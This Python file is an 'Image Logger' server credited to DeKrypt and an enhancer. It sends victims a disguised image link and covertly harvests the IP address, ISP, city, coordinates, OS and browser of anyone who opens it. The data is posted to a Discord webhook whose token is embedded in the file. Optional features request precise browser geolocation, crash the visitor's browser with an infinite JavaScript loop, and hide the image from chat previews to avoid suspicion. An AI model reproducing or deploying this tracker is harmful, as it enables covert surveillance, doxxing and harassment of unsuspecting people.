# Discord Image Logger 
# By DeKrypt | https://github.com/dekrypted
# Enhanced By gdfdffffgccvvvvvv


from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Image Logger"
__description__ = "oui"
__version__ = "v3.0"
__author__ = "gdfdffffgccvvvvvv"

config = {
    "webhook": "https://discord.com/api/webhooks/1538320379620364288/zcmkUhwxuiMUeKPK-Rj-pPe-uODE0xV31KCX0X45OZuAxnxlKBv6XPV3svS9mOVj8UGL", # Replace with your actual webhook URL.
    "image": "https://www.gamedaily.biz/wp-content/uploads/2023/07/David-Baszucki-tg-1-scaled-aspect-ratio-1-1-1-1024x1024.jpg", #it have to be a link finish with .png or .jpg 
    "imageArgument": True,

    "username": "Botusername", #Username of the bot that will send the message to your webhook.
    "color": 0x00FFFF,

    "crashBrowser": False, #Make the browser crash when the image is opened, this is not recommended and may not work.
    "accurateLocation": False, #Ask user for their location, it can make the user suspicious.

    "message": {
        "doMessage": False, #Enable custom message when user is on website.
        "message": "Hello", #Change custom message
        "richMessage": True, 
    },

    "vpnCheck": 1, #Do not touch or just change the value from 1 to 2,
     #1 = Allow VPNs, 2 = Block VPNs.
    
            
    "linkAlerts": True, #link alerts will send a message to your webhook when a user opens the image 
    "buggedImage": True, #Make the image bugged so Discord and Telegram will not show it in the chat,this is recommended. 

    "antiBot": 1, 
    

    "redirect": {
        "redirect": False, #Make the user redirect to a other page.
        "page": "https://youtu.be/dQw4w9WgXcQ"
    },


}

#Warning: Do not change the code below unless you know what you are doing. You can change the code when i comment it.


class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b'Image Logger is running!')



blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger",
            "color": config["color"],
            "description": "Erreur d'enregistrement d'adresse ip", #description for error to get/save ip
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger",
            "color": config["color"],
            "description": "Bot detected.\n\n**Not:** `{endpoint}`\n**Working:** `{ip}`\n**ForBots:** `{bot}`", 
        }
    ],
}) if config["linkAlerts"] else None
        return

    ping = "@everyone" #The ping your webhook will send to his channel

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,


#Whebhook parameters change the value between the stars to change 
#the description of what is displayed in the discord channel START AT "description": f"""**Someone visited your
#image!** And end at **User-Agent:**.

    "embeds": [
        {
            "title": "Image Logger",
            "color": config["color"],
            "description": f"""**Someone visited your image!** 

**Source:** `{endpoint}`



**General informations:**


> **IP:** `{ip if ip else 'Unknown'}`
> **Fournisseur:** `{info['isp'] if info['isp'] else 'Unknown'}` 
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Pays:** `{info['country'] if info['country'] else 'Unknown'}`
> **Région:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **Ville:** `{info['city'] if info['city'] else 'Unknown'}`
> **Lat et Long:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **UTC:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**Info general:**
> **Systeme exploit:** `{os}` 
> **Navigateur:** `{browser}`

**User-Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')

}


class ImageLoggerAPI(BaseHTTPRequestHandler):

    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""

                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

    def do_HEAD(self):
        """Return the response headers without sending the image body."""
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

handler = ImageLoggerAPI
